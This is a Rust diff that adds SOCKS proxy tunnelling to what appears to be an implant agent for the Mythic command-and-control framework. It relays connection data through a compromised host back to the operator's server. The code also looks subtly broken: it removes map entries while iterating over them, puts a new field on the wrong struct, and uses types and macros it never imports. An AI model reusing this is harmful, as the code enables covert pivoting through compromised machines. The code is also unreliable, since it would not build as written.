@@ -1,4 +1,5 @@
 use crate::agent;
+use crate::socks::{start_socks, SocksState};
 use crate::mythic_error;
 use std::collections::VecDeque;
 use std::error::Error;
@@ -31,6 +32,7 @@ pub struct BackgroundTask {
     /// Flag indicating if this background task is designed to be manually killed
     pub killable: bool,
 
+    pub socks_state: Option<Arc<SocksState>>,
     /// Task id from Mythic associated with background task
     pub uuid: String,
 
@@ -71,6 +73,7 @@ impl Tasker {
             completed_tasks: Vec::new(),
             dispatch_val: 0,
             cached_ids: VecDeque::new(),
+            socks_state: None,  // ← ADD THIS LINE
         }
     }
 
@@ -137,6 +140,16 @@ impl Tasker {
                         if let Err(e) = self.spawn_background(task, ssh::run_ssh, false) {
                             self.completed_tasks
                                 .push(mythic_error!(task.id, e.to_string()));
+                        }
+                        continue;
+                    }
+                    "socks" => {
+                        if self.socks_state.is_none() {
+                            let socks_state = Arc::new(SocksState::new());
+                            self.socks_state = Some(socks_state.clone());
+                            if let Err(e) = self.spawn_background(task, |tx, rx| start_socks(&tx, rx, socks_state), true) {
+                                self.completed_tasks.push(mythic_error!(task.id, e.to_string()));
+                            }
                         }
                         continue;
                     }
@@ -223,35 +236,57 @@ impl Tasker {
     }
 
     pub fn get_completed_tasks(&mut self) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
-        // Create the completed task information list
         let mut completed_tasks: Vec<serde_json::Value> = Vec::new();
-
-        // Iterate over running background jobs
+    
+        // Existing background task logic...
         for task in self.background_tasks.iter() {
-            // Check if a background job has any messages to send up to Mythic and add
-            // them to the completed_tasks Vec
             while let Ok(msg) = task.rx.try_recv() {
                 completed_tasks.push(msg);
             }
-
-            // Check if the background task is still running.
             if !task.running.load(Ordering::SeqCst) || Arc::strong_count(&task.running) == 1 {
-                // If the task is marked as ended, grab all of the messages from the channel queue
                 while let Ok(msg) = task.rx.try_recv() {
                     completed_tasks.push(msg);
                 }
-
                 task.running.store(false, Ordering::SeqCst);
                 self.cached_ids.push_back(task.id);
             }
         }
-
-        // Filter out any background tasks which are not running
-        self.background_tasks
-            .retain(|x| x.running.load(Ordering::SeqCst));
-
+        self.background_tasks.retain(|x| x.running.load(Ordering::SeqCst));
+    
+        // ADD: SOCKS outbound messages
+        if let Some(socks_state) = &self.socks_state {
+            let mut outbound = socks_state.outbound.lock().unwrap();
+            let mut conns = socks_state.connections.lock().unwrap();
+            
+            // Collect data from connection readers
+            for (id, (_, rx)) in conns.iter_mut() {
+                while let Ok(data) = rx.try_recv() {
+                    if data.is_empty() {
+                        outbound.push(SocksMsg { exit: true, server_id: *id, data: String::new() });
+                        conns.remove(id);
+                    } else {
+                        outbound.push(SocksMsg {
+                            exit: false,
+                            server_id: *id,
+                            data: general_purpose::STANDARD.encode(&data),
+                        });
+                    }
+                }
+            }
+            
+            if !outbound.is_empty() {
+                let socks_json = serde_json::to_value(outbound.clone()).unwrap();
+                completed_tasks.push(json!({
+                    "user_output": "socks_data",
+                    "completed": true,
+                    "task_id": "socks_outbound",
+                    "socks": socks_json  // Mythic expects "socks" array in responses
+                }));
+                outbound.clear();
+            }
+        }
+    
         completed_tasks.append(&mut self.completed_tasks);
-
         Ok(completed_tasks)
     }
 
